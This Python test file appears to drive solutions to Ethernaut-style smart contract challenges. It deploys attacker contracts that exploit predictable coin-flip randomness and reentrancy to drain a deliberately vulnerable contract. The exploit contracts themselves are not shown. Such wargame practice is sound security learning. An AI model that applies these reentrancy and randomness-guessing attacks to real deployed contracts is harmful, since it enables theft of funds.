from scripts.helpful_scripts import *
from scripts.deploy import *

def test_coinFlip():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        coinFlip = CoinFlip.deploy({"from": account}, publish_source=False)
    else:
        coinFlipAddress = config["networks"][network.show_active()]["coinFlip_address"]
        coinFlip = Contract.from_abi("CoinFlip", coinFlipAddress, CoinFlip.abi)

    attacker = CoinFlipAttacker.deploy(coinFlip.address, {"from": account}, publish_source=False)
    #network.gas_limit(6700000)
    for x in range(0, 10):
        attacker.guessFlip({"from": account}).wait(1)
    print("CoinFlip attacked! Try submitting the solution as complete.")

def test_reentrance():
    account = get_account()

    reentrance = deploy_contract(Reentrance, "Reentrance", 1, [])
    print(f"Before the attack...account balance: {reentrance.balanceOf(account.address)}")
    #attacker = deploy_contract(AttackReentrancy, "AttackReentrancy", 0, [reentrance.address])

    attacker = AttackReentrancy.deploy(reentrance.address, {"from": account.address, "value":Wei("0.01 ether")}, publish_source=False)
    
    attacker.attack(Wei("0.01 ether"), {"from":account.address}).wait(1)
    print(f"After the attack...account balance: {reentrance.balanceOf(account.address)}, count: {attacker.count()}")
    